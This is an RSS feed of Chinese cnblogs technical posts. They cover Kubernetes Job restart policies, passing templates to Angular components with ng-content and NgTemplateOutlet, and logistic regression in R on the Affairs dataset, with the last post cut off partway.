<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Job 失败了怎么办？- 每天5分钟玩转 Docker 容器技术（133） - CloudMan</title>
<link>http://www.cnblogs.com/CloudMan6/p/8457932.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CloudMan6/p/8457932.html</guid>
<description>&lt;p&gt;&lt;span&gt;上一节讨论了 Job 执行成功的情况，如果失败了会怎么样呢？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;修改 myjob.yml，故意引入一个错误：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/DQmck7VYZNw7UbH2utZrJLYhuLspLmBdTMgY8eS5TUuWgea/646.png&quot; alt=&quot;646.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;先删除之前的 Job：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/0x0/https://steemitimages.com/DQmNN349ZMC2kVq5Si55gMZrTKaVt5FQG3ARgTT49b7eMKz/648.png&quot; alt=&quot;648.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;如果将 &lt;/span&gt;&lt;code&gt;&lt;span&gt;restartPolicy&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 设置为 &lt;/span&gt;&lt;code&gt;&lt;span&gt;OnFailure&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 会怎么样？下面我们实践一下，修改 myjob.yml 后重新启动。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;运行新的 Job 并查看状态：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/DQmRPT9mpRreg9D8PqeXTj8EauMm56dsEA9JV7FyGF9kLfi/647.png&quot; alt=&quot;647.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;当前 &lt;/span&gt;&lt;code&gt;&lt;span&gt;SUCCESSFUL&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 的 Pod 数量为 &lt;/span&gt;&lt;code&gt;&lt;span&gt;0&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，查看 Pod 的状态：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/0x0/https://steemitimages.com/DQmRURV5Cg7cQxTSfYUBF1H4jDUSQF8ysFNmr4YdMtvkq2n/649.png&quot; alt=&quot;649.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;可以看到有多个 Pod，状态均不正常。&lt;/span&gt;&lt;code&gt;&lt;span&gt;kubectl describe pod&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 查看某个 Pod 的启动日志：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/DQmTzEub3BvEyAUXNhtpvspASGWGasMkTVujTSuCLXFX9Ti/650.png&quot; alt=&quot;650.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;日志显示没有可执行程序，符合我们的预期。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;下面解释一个现象：为什么 &lt;/span&gt;&lt;code&gt;&lt;span&gt;kubectl get pod&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 会看到这么多个失败的 Pod？&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;原因是：当第一个 Pod 启动时，容器失败退出，根据 &lt;/span&gt;&lt;code&gt;&lt;span&gt;restartPolicy: Never&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，此失败容器不会被重启，但 Job &lt;/span&gt;&lt;code&gt;&lt;span&gt;DESIRED&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 的 Pod 是 &lt;/span&gt;&lt;code&gt;&lt;span&gt;1&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，目前 &lt;/span&gt;&lt;code&gt;&lt;span&gt;SUCCESSFUL&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 为 &lt;/span&gt;&lt;code&gt;&lt;span&gt;0&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，不满足，所以 Job controller 会启动新的 Pod，直到 &lt;/span&gt;&lt;code&gt;&lt;span&gt;SUCCESSFUL&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 为 &lt;/span&gt;&lt;code&gt;&lt;span&gt;1&lt;/span&gt;&lt;/code&gt;&lt;span&gt;。对于我们这个例子，&lt;/span&gt;&lt;code&gt;&lt;span&gt;SUCCESSFUL&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 永远也到不了 &lt;/span&gt;&lt;code&gt;&lt;span&gt;1&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，所以 Job controller 会一直创建新的 Pod。为了终止这个行为，只能删除 Job。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/0x0/https://steemitimages.com/DQmNN349ZMC2kVq5Si55gMZrTKaVt5FQG3ARgTT49b7eMKz/648.png&quot; alt=&quot;648.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;如果将 &lt;/span&gt;&lt;code&gt;&lt;span&gt;restartPolicy&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 设置为 &lt;/span&gt;&lt;code&gt;&lt;span&gt;OnFailure&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 会怎么样？下面我们实践一下，修改 myjob.yml 后重新启动。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/DQmUUgZSATER7mvZK4pyKABLshmto53WMNDUgcKRAvoMkri/651.png&quot; alt=&quot;651.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;Job 的 &lt;/span&gt;&lt;code&gt;&lt;span&gt;SUCCESSFUL&lt;/span&gt;&lt;/code&gt;&lt;span&gt; Pod 数量还是为 &lt;/span&gt;&lt;code&gt;&lt;span&gt;0&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，看看 Pod 的情况：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://steemitimages.com/0x0/https://steemitimages.com/DQmQwTq8AmMGnKhm5ETemumkCj1EZ1qD3L5unyc74rbrYqv/652.png&quot; alt=&quot;652.png&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;这里只有一个 Pod，不过 &lt;/span&gt;&lt;code&gt;&lt;span&gt;RESTARTS&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 为 &lt;/span&gt;&lt;code&gt;&lt;span&gt;3&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，而且不断增加，说明 &lt;/span&gt;&lt;code&gt;&lt;span&gt;OnFailure&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 生效，容器失败后会自动重启。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;下一节我们讨论提高 Job 执行效率的方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;&lt;strong&gt;书籍：&lt;/strong&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1.《每天5分钟玩转Docker容器技术》&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;a href=&quot;https://item.jd.com/16936307278.html&quot; target=&quot;_blank&quot;&gt;https://item.jd.com/16936307278.html&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;2.《每天5分钟玩转OpenStack》&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;a href=&quot;https://item.jd.com/12086376.html&quot; target=&quot;_blank&quot;&gt;https://item.jd.com/12086376.html&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img title=&quot;https://i.imgsafe.org/68/68da21ce15.png&quot; src=&quot;https://image.ipaiban.com/upload-ueditor-image-20171205-1512465642434079417.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 21:29:00 +0000</pubDate>
<dc:creator>CloudMan</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/CloudMan6/p/8457932.html</dc:identifier>
</item>
<item>
<title>Angular 向组件传递模板的几种方法 - 不如隐茶去</title>
<link>http://www.cnblogs.com/JacZhu/p/8460674.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/JacZhu/p/8460674.html</guid>
<description>&lt;p&gt;最近在写一个日期选择器组件，为了满足将来可能出现的各种需求，所以需要能够高度的自定义组件的样式。为了达到这个目的，需要能够在日期选择器组件外控制每个日期格子内要显示的内容，比如，标上节假日之类的。这时候，组件的一部分模板就需要由调用方提供。&lt;/p&gt;
&lt;p&gt;在 React 里面，这种需求挺简单的，只要实现一个 &lt;code&gt;date =&amp;gt; Element&lt;/code&gt; 这样的函数就好了，但是 Angular 模板是纯粹的模板，需要使用一些专门的概念才能实现这个功能。&lt;/p&gt;
&lt;h2 id=&quot;第一种方式-ng-content&quot;&gt;第一种方式 &lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 这个标签到本文撰写时为止，还没有官方的文档，甚至连占位符都没有。但是这并不妨碍我们的使用，外国热心网友已经总结出了 &lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 在现阶段的特点与作用。&lt;/p&gt;
&lt;h3 id=&quot;基本用法&quot;&gt;基本用法&lt;/h3&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;co&quot;&gt;&amp;lt;!-- Wrapper.Component.html --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
    hello
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;ng-content&amp;gt;&amp;lt;/ng-content&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;假设我们有一个上述的组件，然后向下面这样调用：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;wrapper&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt; World &lt;span class=&quot;kw&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/wrapper&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么最终的渲染结果将会是这样的：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
    hello
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt; World &lt;span class=&quot;kw&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;看起来就是发生了很简单的替换，但是如果在 &lt;code&gt;Wrapper&lt;/code&gt; 中出现了多个 &lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 会出现多个 &lt;code&gt;&amp;lt;span&amp;gt; World &amp;lt;/span&amp;gt;&lt;/code&gt; 吗？答案是不会的。&lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 的本质只是移动元素，并不会去自动的创建传入的模板，所以就算用 &lt;code&gt;ngFor&lt;/code&gt; 套住 &lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 也不会出现很多个 &lt;code&gt;&amp;lt;span&amp;gt; World &amp;lt;/span&amp;gt;&lt;/code&gt;。如果传入的是自定义的组件，这些组件也只会被实例化一次。&lt;/p&gt;
&lt;h3 id=&quot;进阶用法&quot;&gt;进阶用法&lt;/h3&gt;
&lt;p&gt;当然，如果 &lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 的功能仅仅只是这样就显得太鸡肋了，在使用 &lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 的时候可以指定一个选择器，这个选择器可以捕获相符的&lt;strong&gt;直接子元素&lt;/strong&gt;。例如：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;co&quot;&gt;&amp;lt;!-- Wrapper.Component.html --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
    hello
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;ng-content&amp;gt;&amp;lt;/ng-content&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;hr/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;ng-content&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; select=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;span&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;/ng-content&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后像下面这样使用：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;wrapper&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt; World &lt;span class=&quot;kw&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
    2333
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/wrapper&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最终的渲染结果将会是这样：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;div&amp;gt;&lt;/span&gt;
    hello
    2333
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;hr/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt; World &lt;span class=&quot;kw&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;除了设置 &lt;code&gt;ng-content&lt;/code&gt; 标签的 &lt;code&gt;select&lt;/code&gt; 属性之外，还可以在子元素上使用 &lt;code&gt;ngProjectAs&lt;/code&gt; 属性，这个属性可以让这个元素被父元素中指定的 &lt;code&gt;ng-content&lt;/code&gt; 所捕获。举个例子：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;wrapper&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;div&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; ngProjectAs=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;span&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; World &lt;span class=&quot;kw&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    2333
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/wrapper&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这次被传入的模板变成了一个 &lt;code&gt;div&lt;/code&gt;，但是因为设置了 &lt;code&gt;ngProjectAs&lt;/code&gt;，所以“World”会出现在分割线下方。&lt;/p&gt;
&lt;h2 id=&quot;第二种方式-ngtemplateoutlet-指令&quot;&gt;第二种方式 &lt;code&gt;NgTemplateOutlet&lt;/code&gt; 指令&lt;/h2&gt;
&lt;p&gt;使用 &lt;code&gt;ng-content&lt;/code&gt; 确实可以起到传入模板的效果，但是却有个很致命的问题，就是无法传递数据到传入的模板中。为了将数据传递到传入的模板中，就需要使用到 &lt;code&gt;NgTemplateOutlet&lt;/code&gt; 指令。&lt;/p&gt;
&lt;h3 id=&quot;基本使用&quot;&gt;基本使用&lt;/h3&gt;
&lt;p&gt;这个指令可以用来在模板的指定位置实例化一个 &lt;code&gt;TemplateRef&lt;/code&gt; 对象，同时，在实例化的过程中还可以传入一个数据对象。而 &lt;code&gt;TemplateRef&lt;/code&gt; 可以通过 &lt;code&gt;ng-template&lt;/code&gt; 标签来创建，举个例子：&lt;/p&gt;
&lt;pre class=&quot;ts&quot;&gt;
&lt;code&gt;@Component({
  selector: 'ng-template-outlet-example',
  template: `
    &amp;lt;ng-container *ngTemplateOutlet=&quot;name; context: myContext&quot;&amp;gt;&amp;lt;/ng-container&amp;gt;

    &amp;lt;ng-template #name let-name=&quot;data&quot;&amp;gt;&amp;lt;span&amp;gt;Hello {{name}}!&amp;lt;/span&amp;gt;&amp;lt;/ng-template&amp;gt;
`
})
class NgTemplateOutletExample {
  myContext = {data: 'World'};
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;ng-container&lt;/code&gt; 是一个虚拟的元素，在这个元素上我们使用了一个 &lt;code&gt;NgTemplateOutlet&lt;/code&gt; 指令，指定了要实例化下面的名为 &lt;code&gt;name&lt;/code&gt; 的 &lt;code&gt;ng-template&lt;/code&gt;。同时把 &lt;code&gt;myContext&lt;/code&gt; 这个对象作为实例化的数据上下文传入，所以最终就会显示 “Hello World!”。值得注意的是在 &lt;code&gt;ng-template&lt;/code&gt; 里面获取传输的数据上下文的方式：&lt;code&gt;let-variableName='key'&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;进阶使用&quot;&gt;进阶使用&lt;/h3&gt;
&lt;p&gt;接下来就要实现本文开头提到的需求了，在组件外部传入模板。还是以上面的例子为例，因为模板需要由外界作为子内容传入，所以需要我们手动来捕获模板，这里需要就需要使用 &lt;a href=&quot;https://angular.cn/api/core/ContentChild&quot;&gt;&lt;code&gt;ContentChild&lt;/code&gt;&lt;/a&gt;：&lt;/p&gt;
&lt;pre class=&quot;ts&quot;&gt;
&lt;code&gt;@Component({
  selector: 'wrapper',
  template: `
    &amp;lt;ng-container *ngTemplateOutlet=&quot;name; context: myContext&quot;&amp;gt;&amp;lt;/ng-container&amp;gt;
`
})
class NgTemplateOutletExample {
  @ContentChild(TemplateRef) name: TemplateRef&amp;lt;any&amp;gt;;
  myContext = {data: 'World'};
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就是这么简单的改动就可以让我们的组件从外界接受模板了，来试一试：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;wrapper&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;ng-template&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; let-value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt;Hello {{value}}!&lt;span class=&quot;kw&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/ng-template&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/wrapper&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;以上就是 Angular 中向组件传递模板的两种方法，其中，使用 &lt;code&gt;&amp;lt;ng-content&amp;gt;&lt;/code&gt; 标签可以更方便的控制传入的模板在 DOM 中的位置，而 &lt;code&gt;NgTemplateOutlet&lt;/code&gt; 可以向传入的模板传递渲染数据，两者搭配使用可以起到很好的效果。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://medium.com/claritydesignsystem/ng-content-the-hidden-docs-96a29d70d11b&quot;&gt;ng-content: The hidden docs&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 18:41:00 +0000</pubDate>
<dc:creator>不如隐茶去</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/JacZhu/p/8460674.html</dc:identifier>
</item>
<item>
<title>R语言-广义线性模型 - 月上贺兰</title>
<link>http://www.cnblogs.com/luhuajun/p/8460601.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/luhuajun/p/8460601.html</guid>
<description>&lt;p&gt;使用场景:结果变量是类别型,二值变量和多分类变量,不满足正态分布&lt;/p&gt;
&lt;p&gt;　　　　  结果变量是计数型,并且他们的均值和方差都是相关的&lt;/p&gt;
&lt;p&gt;解决方法:使用广义线性模型,它包含费正太因变量的分析&lt;/p&gt;
&lt;p&gt;1.Logistics回归(因变量为类别型)&lt;/p&gt;
&lt;p&gt;　　案例:匹配出发生婚外情的模型&lt;/p&gt;
&lt;p&gt;　　1.查看数据集的统计信息&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;library(AER)
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; data(Affairs,package = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;AER&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;summary(Affairs)
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; table(Affairs$affairs)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222232721069-1122603458.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:该数据从601位参与者收集了,婚外情次数,性别,年龄,结婚年限,是否有孩子,宗教信仰,教育背景,职业,婚姻的自我评价这9个变量&lt;/p&gt;
&lt;p&gt;　　　　 结果变量是婚外情发生的次数72%的夫妻没有婚外情,最多的是一年中每月都有婚外情占6%&lt;/p&gt;
&lt;p&gt;　　2.将结果值转换为二值型因子&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; Affairs$ynaffair[Affairs$affairs &amp;gt; 0] &amp;lt;- 1
&lt;span&gt;2&lt;/span&gt; Affairs$ynaffair[Affairs$affairs == 0] &amp;lt;-&lt;span&gt; 0
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; Affairs$ynaffair &amp;lt;-&lt;span&gt; factor(Affairs$ynaffair, 
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;                            levels=c(0,1&lt;span&gt;),
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;                            labels=c(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;No&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; table(Affairs$ynaffair)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222233427675-1634647853.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　3.将该因子作为二值型变量的结果变量&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; fit.full &amp;lt;- glm(ynaffair ~ gender + age + yearsmarried + children + 
&lt;span&gt;2&lt;/span&gt;                   religiousness + education + occupation +&lt;span&gt;rating,
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;                 data=Affairs,family=&lt;span&gt;binomial())
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; summary(fit.full)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222233638217-1320771274.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　结果:性别,是否有孩子,学历和职业对模型不显著,去除后进行分析&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; fit.reduced &amp;lt;- glm(ynaffair ~ age + yearsmarried + religiousness + 
&lt;span&gt;2&lt;/span&gt;                      rating, data=Affairs, family=&lt;span&gt;binomial())
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; summary(fit.reduced)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　3.使用卡方检验来判断比较&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; anova(fit.reduced,fit.full,test = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Chisq&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222234003164-1301797960.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　 结果:p=0.21,表示新模型的拟合更好&lt;/p&gt;
&lt;p&gt;　　4.解释模型参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;coef(fit.reduced)
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; exp(coef(fit.reduced))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1173792/201802/1173792-20180222234255253-34683347.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
